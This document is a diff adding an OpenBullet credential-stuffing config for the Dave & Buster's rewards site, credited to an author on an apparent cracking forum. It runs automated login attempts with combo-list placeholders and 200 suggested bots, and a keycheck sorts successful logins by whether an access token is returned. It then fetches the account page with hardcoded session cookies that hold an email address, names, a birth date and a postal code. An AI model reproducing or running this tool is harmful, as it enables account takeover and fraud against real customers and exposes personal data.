@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "D&B",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-29T00:33:51.0255035-05:00",
+  "AdditionalInfo": "",
+  "Author": "SLAYA ON C.TO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.daveandbusters.com/umbraco/surface/Janrain/PostAuthTraditional" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://www.daveandbusters.com/umbraco/surface/Janrain/PostAuthTraditional" 
+  CONTENT "{\"signInEmailAddress\":\"<USER>\",\"currentPassword\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 82" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "cookie: acceptCookie=true; visid_incap_114910=<COOKIES(visid_incap_114910)>; incap_ses_113_114910=<COOKIES(incap_ses_113_114910)>AWSALB=<COOKIES(AWSALB)>; AWSALBCORS=<COOKIES(AWSALBCORS)>" 
+  HEADER "origin: https://www.daveandbusters.com" 
+  HEADER "referer: https://www.daveandbusters.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+
+REQUEST GET "https://www.daveandbusters.com/rewards/customer-account/" 
+  
+  HEADER "cookie: acceptCookie=true; visid_incap_114910=ckKSx+4NSMqQwiREkS/QErjxWV4AAAAAQUIPAAAAAADBpJyuB7gQVecVfxdfP+Wj; incap_ses_113_114910=mZcKX0R+EFMQXmiN5HWRAbjxWV4AAAAAV+bGRClbB2u3nWDW6/JVHg==; ASP.NET_SessionId=frabutl5uj1hxgxk1dkbaehb; favouritelocation=Id=52; dnb_jnr_usr_token=%22eyJhY2Nlc3NfdG9rZW4iOiIybndrZW5oOGVlajRkcHRjIn0%3D%22; dnbsecuredtoken=%7B%22id%22%3A10832282%2C%22email_address%22%3A%22bovexow483%40oppamail.com%22%2C%22default_store%22%3A0%2C%22password%22%3Anull%2C%22last_name%22%3A%22egwgfw%22%2C%22birth_date%22%3A%222001-04-03T00%3A00%3A00%22%2C%22card_number%22%3Anull%2C%22first_name%22%3A%22wefwefwe%22%2C%22member_preferences%22%3A%5B%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A1%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A2%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A3%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A4%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A5%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A6%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A9%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A10%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A11%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A12%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A13%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A14%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A15%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A16%7D%2C%7B%22selected%22%3Afalse%2C%22preference_choice_id%22%3A17%7D%5D%2C%22phone_optin%22%3Afalse%2C%22email_optin%22%3Afalse%2C%22postal_code%22%3A%2252154%22%2C%22DnBSecuredToken%22%3A%22C%2Bz1KLMbrBV36O5myczASCTLNPp2998ef46mLyuCzBz8NNpYS3Tqbseir0hQkH0sIr86%2BPotYnpq3KfuMLWvoYPZZgYLtrXmBk%2Bw4%2B0cMxaPiovIeKGRaoPTofi7CXV8%22%7D; AWSALB=l/MVwvoUDB6qqTpVlnjmXGkCDoZ97xqG6SCHm6Ln4Su+Vx1w67a3TWM3WoPUYCOw1gFswhskekp/Fe8oo0gRXh7zuFBRIZCKoXZ6b9fy5qeDPA7R10FpOw6SZnYd; AWSALBCORS=l/MVwvoUDB6qqTpVlnjmXGkCDoZ97xqG6SCHm6Ln4Su+Vx1w67a3TWM3WoPUYCOw1gFswhskekp/Fe8oo0gRXh7zuFBRIZCKoXZ6b9fy5qeDPA7R10FpOw6SZnYd" 
+
